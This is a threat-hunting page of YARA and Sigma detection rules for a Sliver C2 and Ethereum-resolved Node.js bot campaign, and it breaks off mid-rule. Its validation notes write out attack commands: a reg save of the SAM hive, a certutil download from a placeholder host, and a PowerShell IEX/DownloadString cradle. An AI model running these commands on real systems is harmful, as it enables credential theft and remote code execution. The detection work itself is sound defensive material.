---
title: "Detection Rules — Sliver C2 Windows Post-Exploitation Staging, 193.233.202.17"
description: "Hunting and detection rules for Sliver C2 Windows post-exploitation staging (193.233.202.17). 4 YARA, 12 Sigma and 2 Suricata rules."
date: '2026-09-06'
layout: post
permalink: /hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
thumbnail: /assets/images/cards/sliver-c2-windows-postex-staging-193-233-202-17.png
hide: true
---

**Campaign:** Sliver-C2-Windows-PostEx-Staging-193.233.202.17
**Date:** 2026-09-06
**Author:** The Hunters Ledger
**License:** CC BY 4.0
**Reference:** https://the-hunters-ledger.com/reports/sliver-c2-windows-postex-staging-193-233-202-17/

---

## Detection Coverage Summary

| Rule Type | Detection | Hunting | MITRE Techniques Covered | Atomics → feed |
|---|---|---|---|---|
| YARA | 2 | 2 | T1071.001, T1102.001, T1547.001 | 0 (already in IOC feed) |
| Sigma | 6 | 6 | T1059.001, T1053.005, T1003.001, T1003.002, T1003.004, T1112, T1021.001, T1548.002, T1098, T1136.002, T1547.001, T1036.005, T1105, T1685, T1059.007, T1620, T1027 | 0 (already in IOC feed) |
| Suricata | 2 | 0 | T1071.001 | 0 (already in IOC feed) |

> **Detection vs Hunting:** *Detection rules* are high-fidelity and evasion-resilient, safe to alert on. *Hunting rules* are broader, for scoping and threat-hunting; expect to review the hits.

Every atomic in this campaign (the operator IP, the fallback IPs, the five rotated C2 domains, the file hashes, the blockchain resolver constants) is already routed to `threat-intel-vault/ioc-feeds/sliver-c2-windows-postex-staging-193-233-202-17-iocs.json`, including the correct `HUNT ONLY, NEVER BLOCK` classification on `77.110.126.46`. Nothing here duplicates that feed; every rule below keys on a behavior or a build artifact that survives the address and domain rotation this operator has already demonstrated five times.

---

## Multi-Family Organization

This campaign runs two hard-linked strands: a **Sliver** beacon plus supporting **Go reverse-shell stubs**, and an **EtherRAT-class Node.js bot** that resolves its C2 from an Ethereum smart contract. A fourth grouping, **Operator scripts and deployment**, covers the PowerShell/batch tradecraft used against the Windows Active Directory estate regardless of which C2 strand issued it. Tier subsections come first; each family is labeled inside its tier.

---

## YARA Rules

### Detection Rules

**Sliver**

#### Sliver Operator Build Artifacts, 193.233.202.17 Campaign

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1071.001 (Web Protocols)
**Confidence:** HIGH
**False Positives:** None known for the `/tmp/` operator source paths, which are not standard Go toolchain output, except that `/tmp/payloads/` is a generic directory name that is not campaign-exclusive, so two generic `/tmp/` strings from unrelated tooling can satisfy the condition. The `Chrome/108.0.6602.492` string alone is a build-profile constant that could theoretically be copy-pasted into an unrelated tool, so the rule requires two independent strings before it fires.
**Blind Spots:** Misses any build that holds fewer than two of the six strings: changing the source-directory convention so that only the User-Agent remains already misses, and so does changing the User-Agent while leaving only one path. Does not fire on the Sliver beacon's own shellcode blob (`slv_beacon_sc.bin`), which yielded nothing to static string analysis.
**Validation:** A build matches only if it holds two of the six strings. In the published report, small reverse shells carry individual `/tmp/` paths and a separate beacon carries the User-Agent, so which of the operator's named builds (e.g. `da_shell_39.exe`, `ws37.exe`, `svchost_update.exe`) hold two anchors is not established, and sample recall is NOT CHECKED. A benign case that must NOT fire: a clean Windows PE, or a legitimately compiled Go binary that happens to embed a real, internally consistent Chrome User-Agent string.
**Deployment:** Endpoint file scan, static triage of samples pulled from staging infrastructure.

```yara
/*
   Yara Rule Set
   Identifier: Sliver-C2-Windows-PostEx-Staging-193.233.202.17
   Author: The Hunters Ledger
   Source: https://the-hunters-ledger.com/
   License: CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/
*/

rule Sliver_Operator_Build_Artifacts_193_233_202_17 {
   meta:
      description = "Detects PE files (MZ header, under 25MB; no Go marker is tested) that hold at least two of six strings: five of this operator's /tmp/ source-path strings and the internally impossible Chrome/108.0.6602.492 User-Agent hardcoded into the beacon build profile. The User-Agent alone, or one path alone, does not fire"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/"
      date = "2026-09-06"
      hash1 = "bd61c2880920bbfb86c12df439dd1ca0258a10e532433698fd029aef2a5b33f2"
      family = "Sliver"
      id = "b657aceb-8818-5c3a-ab12-e6bf82b80f1d"
   strings:
      $ua = "Chrome/108.0.6602.492" ascii
      $path1 = "/tmp/revshell" ascii
      $path2 = "/tmp/srv/ws_" ascii
      $path3 = "/tmp/payloads/" ascii
      $path4 = "/tmp/build_nc/main.go" ascii
      $path5 = "/tmp/efspot/efspot.go" ascii
   condition:
      uint16(0) == 0x5A4D and filesize < 25MB and 2 of them
}
```

**EtherRAT-class Node.js bot**

#### EtherRAT-class Node.js Bot Configuration Constants

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1102.001 (Dead Drop Resolver), T1071.001 (Web Protocols)
**Confidence:** HIGH
**False Positives:** None known. The condition needs two of the seven strings and at least one of the four resolver constants (contract address, storage key, ABI selector, build id), so the header, the identity-file name and the Run-key string alone no longer fire. The contract address, storage key and build id are specific to this operator's deployed resolver; the selector `0x7d434425` is a short value that another contract or a write-up can contain, so the selector plus `.node_bot_id` would fire. Not goodware-validated, and scored Robustness 2 because the configuration constants are a mutable family combination.
**Blind Spots:** Requires at least one resolver constant and a second configuration string to be present in the scanned content, so a decrypted or deobfuscated configuration is needed; will not fire against the still-encrypted MSI payload before extraction. A future build using a different resolver contract (a genuine redeploy, not merely a C2 rotation) would need a new rule.
**Validation:** Trigger by scanning the decrypted Node.js bot stage 3 artifact or its extracted configuration. A benign case that must NOT fire: any unrelated Node.js application, including ones that legitimately call public Ethereum RPC endpoints.
**Deployment:** Endpoint file scan, of files or saved dumps. The condition tests `filesize`, which is undefined in a libyara live process-memory scan, so the rule matches files and saved dumps only.

```yara
/*
   Yara Rule Set
   Identifier: Sliver-C2-Windows-PostEx-Staging-193.233.202.17
   Author: The Hunters Ledger
   Source: https://the-hunters-ledger.com/
   License: CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/
*/

rule EtherRAT_NodeJS_Bot_Config_TheGentlemen {
   meta:
      description = "Detects the decrypted EtherRAT-class Node.js bot configuration by its Ethereum smart-contract resolver constants, custom polling header, and identity-file naming, which do not change when the resolved C2 domain rotates"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/"
      date = "2026-09-06"
      hash1 = "86881b8e9d197ac2f734792de48d5dfaebe7cafb6e35d49c5dd7fe6eb697230e"
      family = "EtherRAT-class Node.js bot"
      id = "4db421c9-d511-5bcb-95fa-bc53c5aa8517"
   strings:
      $contract = "0xb3f2897f2bc797e5b9033faef8c81e92b01cb831" ascii nocase
      $storage_key = "0x40b57c3622c1CbfD699207F71F2dE5A8Fe256893" ascii
      $selector = "0x7d434425" ascii
      $build_id = "ff8fee46-5d21-4437-af5b-337434288cae" ascii
      $header = "X-Bot-Server" ascii fullword
      $botid_file = ".node_bot_id" ascii
      $runkey = "conhost --headless" ascii
   condition:
      filesize < 5MB and 2 of them and
      1 of ($contract, $storage_key, $selector, $build_id)
}
```

### Hunting Rules

**Sliver**

#### Sliver Canonical Protobuf Import Path String (Seen in Process Memory of the Analyzed Build)

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1071.001 (Web Protocols), T1102.001 (Dead Drop Resolver, campaign-level)
**Confidence:** MODERATE
**False Positives:** Anything that holds the string, in a file or a memory image: an unmodified (unobfuscated) Sliver implant or server, an authorized red-team engagement, security tooling and signature sets that carry Sliver indicators, repositories that vendor the Sliver protobuf definitions, and write-ups such as this one. No legitimate production software is known to carry it as part of its own function, but that was not measured against a goodware corpus. One literal and no size or format test make this a content lead, not an alert (Robustness 1).
**Blind Spots:** In the analyzed, symbol-obfuscated build the path is absent from the on-disk binary (confirmed on that sample) and present in the running process, so against that build the rule matches a process-memory image or dump and not the packed file. The rule itself cannot tell memory from file input: an unobfuscated build carries the path on disk and matches a file scan too. Only the one analyzed sample was observed, so memory coverage of other builds is not shown. Misses any build that obfuscates or removes this specific protobuf package path in memory as well.
**Validation:** Trigger by scanning the memory image or a dump of the analyzed, obfuscated beacon process; the string should be found (replay against the sample is NOT CHECKED, and other builds are not tested). A benign case that must NOT fire: scanning memory of `svchost.exe`, `explorer.exe`, or any other unrelated Windows process on a clean host. An unobfuscated Sliver binary, or any document that quotes the path, WILL fire.
**Deployment:** Live process memory scanning, memory-forensics triage of a suspected-compromised host, EDR memory-scan modules (the condition has no `filesize` test, so it can match a live process); file scans match unobfuscated builds and copies of the string.

```yara
/*
   Yara Rule Set
   Identifier: Sliver-C2-Windows-PostEx-Staging-193.233.202.17
   Author: The Hunters Ledger
   Source: https://the-hunters-ledger.com/
   License: CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/
*/

rule Sliver_Beacon_Memory_Import_Path {
   meta:
      description = "Detects the canonical Sliver C2 protobuf import path as a string in whatever is scanned. In the analyzed build, symbol obfuscation removed it from the on-disk binary while it was present in process memory; the rule cannot tell memory from file input and also matches unobfuscated builds, signature sets and write-ups"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/"
      date = "2026-09-06"
      hash1 = "bd61c2880920bbfb86c12df439dd1ca0258a10e532433698fd029aef2a5b33f2"
      family = "Sliver"
      id = "075c07ad-7a6c-5b72-9a9c-97e80728ad79"
   strings:
      $s1 = "github.com/bishopfox/sliver/protobuf/sliverpb" ascii
   condition:
      $s1
}
```

**Operator scripts and deployment**

#### Operator AD Deployment Script Success Markers, The Gentlemen-Linked Toolkit

**Tier:** Hunting
**Robustness:** 2
**ATT&CK Coverage:** T1136.002 (Domain Account), T1098 (Account Manipulation), T1003.002 (Security Account Manager)
**Confidence:** MODERATE
**False Positives:** These are operator-authored success markers in plaintext PowerShell, not a compiled binary's internal constants, so a copy of this exact toolkit reused by a different operator, or a leaked/shared script, would also match. Tiered Hunting rather than Detection for that reason, even though the markers are operator-authored plaintext; `DUMP_OK:` is a short echo-style token that other scripts can print, so each marker is a content lead and not a proven operator signature. The condition is `1 of` the three markers.
**Blind Spots:** Misses any rebuild of the deployment scripts that renames these markers. The report records the markers in the PowerShell/batch deployment layer; the rule tests no file type, so any file under 200 KB that holds a marker matches, and the compiled implants are not matched unless they embed a marker. The corporate-proxy bypass call is no longer covered.
**Validation:** Trigger by scanning `adduser.ps1`-class account-creation scripts or the LSASS/hive-dump scripts recovered from this campaign's staging directory. A benign case that must NOT fire: unrelated Active Directory administration scripts that do not echo these specific literal markers.
**Deployment:** Endpoint and file-share scanning for staged or dropped PowerShell/batch scripts; useful as a triage signal on any host serving similar staging content.

```yara
/*
   Yara Rule Set
   Identifier: Sliver-C2-Windows-PostEx-Staging-193.233.202.17
   Author: The Hunters Ledger
   Source: https://the-hunters-ledger.com/
   License: CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/
*/

rule Operator_AD_Deployment_Script_Markers_TheGentlemen {
   meta:
      description = "Detects files (no script type, extension or header is tested) carrying one of this operator's plaintext success markers for domain-account creation, Domain Admins group addition or LSASS dumping. The generic .NET proxy-bypass call GlobalProxySelection.GetEmptyWebProxy() was removed as a standalone marker because ordinary administration scripts contain it"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/"
      date = "2026-09-06"
      hash1 = "f609621698eaad8c4683750fe8bd0e242349be3eea408da593151ff877ed8ab6"
      family = "Operator scripts and deployment"
      id = "71770cb8-7a72-58c4-baab-84a9dcdfb80b"
   strings:
      $m1 = "USER_CREATED_OK" ascii fullword
      $m2 = "ADDED_TO_DA_OK" ascii fullword
      $m3 = "DUMP_OK:" ascii
   condition:
      filesize < 200KB and 1 of them
}
```

---

## Sigma Rules

### Detection Rules

**Sliver**

#### Registry Hive Save Of SAM, SYSTEM Or SECURITY To ProgramData

**Tier:** Detection
**Robustness:** 3
**ATT&CK Coverage:** T1003.002 (Security Account Manager), T1003.004 (LSA Secrets)
**Confidence:** HIGH
**False Positives:** Authorized backup or disaster-recovery tooling that legitimately exports these hives, which is rare and usually scripted to a different destination than `C:\ProgramData`.
**Blind Spots:** Misses a rebuild that writes to a different destination directory or uses a tool other than `reg.exe` (e.g., a custom LSASS/registry API caller).
**Validation:** Trigger by running `reg save HKLM\SAM C:\ProgramData\sam.bak`. A benign case that must NOT fire: `reg save` targeting a legitimate backup share, or `reg export` of an unrelated, non-security hive.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM.

```yaml
title: Registry Save Of SAM, SYSTEM Or SECURITY Hive To ProgramData
id: 21265bec-0634-4d02-a3de-ddbba8f0ca89
status: experimental
description: >-
  Detects reg.exe saving the SAM, SYSTEM, or SECURITY registry hives to a file under
  C:\ProgramData, the offline credential-extraction pattern used to recover local and
  cached domain credentials without touching LSASS directly.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
tags:
    - attack.credential-access
    - attack.t1003.002
    - attack.t1003.004
logsource:
    category: process_creation
    product: windows
    definition: 'Requires process creation logging that populates CommandLine, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
detection:
    selection_image:
        Image|endswith: '\reg.exe'
    selection_verb:
        CommandLine|contains: 'save'
    selection_hive:
        CommandLine|contains:
            - 'SAM'
            - 'SYSTEM'
            - 'SECURITY'
    selection_dest:
        CommandLine|contains: '\ProgramData\'
    condition: selection_image and selection_verb and selection_hive and selection_dest
falsepositives:
    - Authorized backup or disaster-recovery tooling that exports these hives, though the ProgramData destination is unusual for such tooling
level: high
```

#### Account Added To The Domain Admins Group

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1098 (Account Manipulation), T1136.002 (Domain Account)
**Confidence:** HIGH
**False Positives:** Legitimate, change-controlled promotion of an account to Domain Admins by IT staff, which is infrequent in a well-run estate and usually distinguishable by the actor and timing against a change ticket.
**Blind Spots:** Misses privilege escalation via nested group membership (adding an account to a group that is itself a member of Domain Admins) rather than direct addition.
**Validation:** Trigger by adding any account to the Domain Admins security group: must fire. Both authorized and unauthorized direct additions match, because the selection has no actor, caller or change-ticket exclusion, so a pre-approved onboarding addition also fires and is meant to be checked against change records (Detection tier, not silent). A benign case that must NOT fire: adding an account to any group other than Domain Admins, or a membership event that is not a 4728 addition.
**Deployment:** Domain controller Security event log, forwarded to SIEM.

```yaml
title: Account Added To The Domain Admins Group
id: 726b71d6-5aa6-4ab0-9f28-83eca3cdc5be
status: experimental
description: >-
  Detects a security-enabled global group membership change adding an account to Domain
  Admins, the persistence step this campaign's account-creation scripts perform
  immediately after creating a backdoor domain account.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
tags:
    - attack.persistence
    - attack.privilege-escalation
    - attack.t1098
    - attack.t1136.002
    - stp.3
logsource:
    product: windows
    service: security
    definition: 'Requires Windows Security auditing on the Account Management subcategory, "Audit Security Group Management" enabled, on a domain controller.'
detection:
    selection:
        EventID: 4728
        TargetUserName: 'Domain Admins'
    condition: selection
falsepositives:
    - Change-controlled administrative promotion of a new Domain Admin by IT staff
level: high
```

**EtherRAT-class Node.js bot**

#### Run Key Value Starting With A Headless Conhost Launcher And Containing node.exe And A .bak Path

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1547.001 (Registry Run Keys / Startup Folder)
**Confidence:** HIGH
**False Positives:** None known. A Run value whose data begins with the `conhost --headless` launcher token and also contains `node.exe` and a token ending in `.bak` is not a pattern any legitimate Node.js installer or application is known to use.
**Blind Spots:** Robustness is 2 because this is an implementation combination: a rebuild that renames the launcher prefix away from `conhost --headless` (including a full path to `conhost.exe` or a leading quote, which break the start-of-data test) or changes the payload file extension away from `.bak` evades it. The prefix test requires the token `conhost --headless` followed by a space, and the extension test requires `.bak` to be followed by a space, a double or single quote, or to end the data, so a name like `script.bakery` does not match; `node.exe` is tested as a substring anywhere in the data (so `mynode.exe` also matches), and `.bak` is not bound to being node.exe's argument. It matches the `\CurrentVersion\Run\` key in any hive, per-user or machine-wide.
**Validation:** Trigger by creating a Run value (for example under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) whose data begins `conhost --headless ` and contains both `node.exe` and a quoted `.bak` argument, as in the report's example: must fire. Benign cases that must NOT fire: a legitimate Node.js application's own startup registration, which does not use this launcher prefix or file extension; a value that contains `conhost --headless` only after other text; `conhost --headlessXYZ ... node.exe script.bakery`.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM with registry value auditing enabled.

```yaml
title: Run Key Value Starting With A Headless Conhost Launcher And Containing node.exe And A .bak Path
id: 981da035-041b-434b-9db6-141c3c778534
status: experimental
description: >-
  Detects a Run key registry value whose data begins with the token conhost --headless
  (followed by a space), contains node.exe, and contains a token ending in .bak (followed by a
  space or a quote, or ending the data), the persistence mechanism used by an EtherRAT-class Node.js bot
  that resolves its C2 address from an Ethereum smart contract.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
modified: '2026-10-11'
tags:
    - attack.persistence
    - attack.privilege-escalation
    - attack.t1547.001
    - stp.3
logsource:
    category: registry_set
    product: windows
    definition: 'Requires Sysmon Event ID 13 (RegistryEvent SetValue) with value auditing enabled for the Run keys, or Security Event ID 4657.'
detection:
    selection_key:
        TargetObject|contains: '\CurrentVersion\Run\'
    selection_start:
        Details|startswith: 'conhost --headless '
    selection_node:
        Details|contains: 'node.exe'
    selection_bak_mid:
        Details|contains:
            - '.bak '
            - '.bak"'
            - ".bak'"
    selection_bak_end:
        Details|endswith: '.bak'
    condition: selection_key and selection_start and selection_node and 1 of selection_bak_*
falsepositives:
    - Unknown. No legitimate Node.js packaging pattern matches this launcher-plus-extension combination.
level: high
```

#### Suspicious svchost.log File Created In Roaming AppData

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1036.005 (Match Legitimate Name or Location)
**Confidence:** HIGH
**False Positives:** None known. No legitimate Windows component or common third-party application writes a file literally named `svchost.log` into a user's roaming profile; `svchost.exe` itself has no log file, and legitimate logging tools use their own product name.
**Blind Spots:** Misses a rebuild that renames the log file, which the operator controls entirely.
**Validation:** Trigger by creating `%APPDATA%\svchost.log`. A benign case that must NOT fire: legitimate application logs under `%APPDATA%` that carry the application's own name rather than a system-process name.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM with file-creation logging enabled.

```yaml
title: File Named svchost.log Created In Roaming AppData
id: fd7f5f03-27e5-45ab-af81-f8be388e8b5e
status: experimental
description: >-
  Detects creation of a file literally named svchost.log inside a user's roaming AppData
  profile, an operator artifact that borrows a system-process name for a log file in a
  location no legitimate svchost.exe activity ever writes to.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
tags:
    - attack.stealth
    - attack.t1036.005
    - stp.3
logsource:
    category: file_event
    product: windows
    definition: 'Requires Sysmon Event ID 11 (FileCreate) or equivalent EDR file-creation telemetry.'
detection:
    selection:
        TargetFilename|endswith: '\AppData\Roaming\svchost.log'
    condition: selection
falsepositives:
    - Unknown. No legitimate application is known to name a roaming-profile log file svchost.log.
level: high
```

#### node.exe Executing From A Vendor-Named LOCALAPPDATA Directory

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1036.005 (Match Legitimate Name or Location)
**Confidence:** HIGH
**False Positives:** A legitimate developer tool that genuinely bundles a private Node.js runtime under a vendor-style directory name in `%LOCALAPPDATA%` (some Electron-adjacent installers do this); baselining against known developer tooling in the environment is expected.
**Blind Spots:** Misses execution from a directory name not in this list, which the operator can freely change on the next build.
**Validation:** Trigger by executing `node.exe` from `%LOCALAPPDATA%\Google\...` (or any of the listed vendor names) on a host with no legitimate reason to have that path. A benign case that must NOT fire: a genuine per-user install of a vendor product that legitimately bundles Node.js under its own name.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM.

```yaml
title: node.exe Executing From A Vendor-Masquerading LOCALAPPDATA Path
id: fd1ec736-e0fc-4440-a5c9-c6ec26246108
status: experimental
description: >-
  Detects node.exe running from a %LOCALAPPDATA% subdirectory named after a well-known
  vendor (Google, Microsoft, Windows, Extensions, Components, Modules, Packages, Programs,
  Services, or Assemblies), the masquerading path this campaign's Node.js bot uses to blend
  its runtime into a user profile with no legitimate development toolchain.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
tags:
    - attack.stealth
    - attack.t1036.005
    - stp.3
logsource:
    category: process_creation
    product: windows
    definition: 'Requires process creation logging that populates Image, for example Sysmon EID 1 or Security EID 4688.'
detection:
    selection_image:
        Image|endswith: '\node.exe'
    selection_path:
        Image|contains:
            - '\AppData\Local\Google\'
            - '\AppData\Local\Microsoft\'
            - '\AppData\Local\Windows\'
            - '\AppData\Local\Extensions\'
            - '\AppData\Local\Components\'
            - '\AppData\Local\Modules\'
            - '\AppData\Local\Packages\'
            - '\AppData\Local\Programs\'
            - '\AppData\Local\Services\'
            - '\AppData\Local\Assemblies\'
    condition: selection_image and selection_path
falsepositives:
    - A legitimate per-user vendor product that bundles its own Node.js runtime under one of these directory names
level: high
```

**Campaign-Level**

#### Certutil URLCache Download Or WMIC Node-Targeted Certutil Download

**Tier:** Detection
**Robustness:** 2
**ATT&CK Coverage:** T1105 (Ingress Tool Transfer), T1570 (Lateral Tool Transfer)
**Confidence:** HIGH
**False Positives:** None known for the direct branch (`-urlcache -split -f`), which has no common legitimate use outside certificate-cache management (its stated purpose) and is a well-documented LOLBin abuse pattern. The WMIC branch requires a `/node:` argument, `process call create`, `certutil`, `-urlcache` and `-split` in the `wmic` command line, but not `-f`. Certificate-cache maintenance run through wmic, such as `certutil -urlcache * delete`, carries `-urlcache` but not `-split` and does not match. `/node:` names a target host and can name the local machine, so the branch is a node-targeted command-text match, not proof that the command ran on another host.
**Blind Spots:** Misses ingress tool transfer via any binary other than certutil (PowerShell's own `Invoke-WebRequest`/`Invoke-RestMethod`, `bitsadmin`, or a custom downloader). Neither branch tests the download destination, address or port, so a download from an internal host matches as readily as one from an external address. A local `wmic process call create` with no `/node:` argument is not matched by the WMIC branch, and `-split` is required there, so a WMIC-launched `certutil -urlcache -f` without `-split` is missed.
**Validation:** Trigger by running `certutil -urlcache -split -f http://<ip>:<port>/file.exe out.exe`, either directly or via `wmic /node:<host> process call create` invoking the same command remotely. A benign case that must NOT fire: `certutil` used for its ordinary certificate-cache functions without `-urlcache -split -f`, and a `wmic /node:<host> process call create` that launches certutil without `-urlcache -split` (for example `certutil -verify` or `certutil -urlcache * delete`).
**Deployment:** Endpoint EDR / Sysmon-fed SIEM.

```yaml
title: Certutil URLCache Download Or WMIC Node-Targeted Certutil Download
id: 934c780a-ed74-45d9-bbe8-c5540ed96f55
status: experimental
description: >-
  Detects certutil invoked with -urlcache -split -f to fetch a remote file, either directly
  or via wmic process-call-create with a /node: argument that launches certutil with
  -urlcache and -split, the LOLBin ingress-tool-transfer pattern used to stage payloads onto
  internal hosts. /node: names a target and can name the local machine, so the wmic branch
  does not prove a remote host. The download address and port are not tested.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
modified: '2026-10-11'
tags:
    - attack.command-and-control
    - attack.t1105
    - attack.lateral-movement
    - attack.t1570
    - stp.3
logsource:
    category: process_creation
    product: windows
    definition: 'Requires process creation logging that populates CommandLine, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
detection:
    selection_direct:
        Image|endswith: '\certutil.exe'
        CommandLine|contains|all:
            - '-urlcache'
            - '-split'
            - '-f'
    selection_remote:
        Image|endswith: '\WMIC.exe'
        CommandLine|contains|all:
            - '/node:'
            - 'process call create'
            - 'certutil'
            - '-urlcache'
            - '-split'
    condition: selection_direct or selection_remote
falsepositives:
    - Unlikely. certutil -urlcache -split -f has no common legitimate administrative use outside certificate-cache management, which does not use this flag combination.
level: high
```

### Hunting Rules

**Sliver**

#### PowerShell Command Line Containing IEX And DownloadString

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1059.001 (PowerShell), T1053.005 (Scheduled Task)
**ATT&CK Note:** T1053.005 is the persistence mechanism the campaign wraps this cradle in (a weekly SYSTEM task). The selection tests only the PowerShell command line, so a hit is a text-pattern lead for the download-and-execute cradle, not proof of one and not evidence of a scheduled task; review the command content before treating it as the cradle.
**Confidence:** MODERATE
**Rationale:** Re-tiered from Detection to Hunting, and `level` lowered from `high` to `medium`. The selection is `powershell.exe` plus the two substrings `IEX` and `DownloadString` in the command line. It does not test a Task Scheduler parent, the SYSTEM account, `Net.WebClient` or the download URL, so it matches the two strings wherever they appear, in a real cradle, in an interactive session, an installer or a legitimate automation script as readily as in the campaign's weekly SYSTEM task, and the false-positive line below concedes that population. The two substrings are ordinary primitives of a very common PowerShell download cradle, which is Robustness 1 (`stp.2`).
**False Positives:** Legitimate IT automation, installers and bootstrap scripts that download and execute a script with the same cradle, whether interactively, from a scheduled task or from a management platform. The rule cannot separate a SYSTEM scheduled task from an interactive or installer run. Distinguishable in practice by the destination not being an expected update source.
**Blind Spots:** Misses a rebuild that swaps `IEX`/`DownloadString` for a different in-memory execution primitive (e.g., `Invoke-Expression` aliasing, `.Net WebClient` replaced by `Invoke-RestMethod`), or a task that stages the download separately from execution. It does not see a command line that PowerShell reads from a script file or an encoded command.
**Validation:** Trigger by running `powershell -c "iex((New-Object Net.WebClient).DownloadString('http://...'))"` from any context; the campaign runs it from a weekly SYSTEM scheduled task, but the rule does not require that context, so an interactive run fires as well. A benign case that must NOT fire: a PowerShell command line that contains neither `IEX` nor `DownloadString`, for example a scheduled task that reads a local script file rather than downloading and executing remote content. A command line that only quotes both strings (for example `-c "Write-Output 'IEX DownloadString'"`) fires without any download or execution, which is why a hit needs content review.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM. Hunting lead for scoping; check the parent process, the account and the destination before escalating.

```yaml
title: PowerShell Command Line Containing IEX And DownloadString
id: 2875053e-f1d1-429d-bf6a-49ee74d7c6dd
status: experimental
description: >-
  Detects a powershell.exe process whose command line contains both IEX and DownloadString,
  the text of the download-and-execute cradle that this campaign's weekly SYSTEM scheduled task
  uses to re-pull the full attack chain fresh from C2 rather than running a static payload. The
  selection tests no scheduled-task parent, no SYSTEM account, no Net.WebClient and no
  download URL, and it does not parse that anything is downloaded or executed, so it matches
  the two strings wherever they appear, including legitimate installers and automation and a
  command that only quotes them, and is a hunting lead rather than an alert.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
modified: '2026-10-11'
tags:
    - attack.execution
    - attack.t1059.001
    - attack.persistence
    - attack.privilege-escalation
    - attack.t1053.005
    - stp.2
logsource:
    category: process_creation
    product: windows
    definition: 'Requires process creation logging that populates CommandLine, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
detection:
    selection_image:
        Image|endswith: '\powershell.exe'
    selection_cmd:
        CommandLine|contains|all:
            - 'IEX'
            - 'DownloadString'
    condition: selection_image and selection_cmd
falsepositives:
    - Internal automation tooling, installers and bootstrap scripts that intentionally download and execute a remote script with the same cradle
level: medium
```

**Operator scripts and deployment**

#### RDP, UAC Or Token-Filter Registry Value Weakened

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1112 (Modify Registry), T1548.002 (Bypass User Account Control), T1021.001 (Remote Desktop Protocol)
**Confidence:** MODERATE
**False Positives:** A system administrator deliberately enabling RDP or adjusting UAC policy through legitimate registry edits or Group Policy on a server being provisioned. Each of the four values is individually common enough during legitimate hardening or provisioning that a single hit is not high-confidence on its own. Tiered Hunting for that reason: this fires on any one match, and the real corroborating signal is two or more of these on the same host within a short window, which needs analyst correlation rather than a single-event match.
**Blind Spots:** Misses an operator who makes these changes exclusively through Group Policy Object edits at the domain level rather than direct registry writes on the host.
**Validation:** Trigger by setting any one of `fDenyTSConnections` to `0`, `UserAuthentication` to `0`, `LocalAccountTokenFilterPolicy` to `1`, or `EnableLUA` to `0`. A benign case that must NOT fire: none of these four exact value writes occurring.
**Registry value rendering (round 2, 2026-10-11):** raw Sysmon Event 13 renders a DWORD in `Details` as `DWORD (0x........)`, but the Elastic Sysmon pipeline (`logs-windows.sysmon_operational` 3.8.3, script "Set registry fields") writes `registry.data.strings` as the decimal value with type `SZ_DWORD`, per the T-0222 registry telemetry proposal (`Docs/2026-10-10-anthropic-api-credit/fixes/registry-telemetry-proposal.md`). The selection therefore accepts both forms. The decimal form was read from the pipeline script, not from a live event: no Windows endpoint reports to the stack, so neither form has been seen arriving.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM with registry value auditing enabled. Analyst should check for two or more of these on the same host within a short window before escalating.

```yaml
title: RDP, UAC Or Token-Filter Registry Value Weakened
id: b3cdcf57-b8dc-4f30-8420-1cbd8d0548f7
status: experimental
description: >-
  Detects one of the registry value changes used to enable RDP without Network Level
  Authentication or to weaken UAC and remote local-account token filtering. Two or more of
  these on the same host in a short window is the actual campaign signature and needs
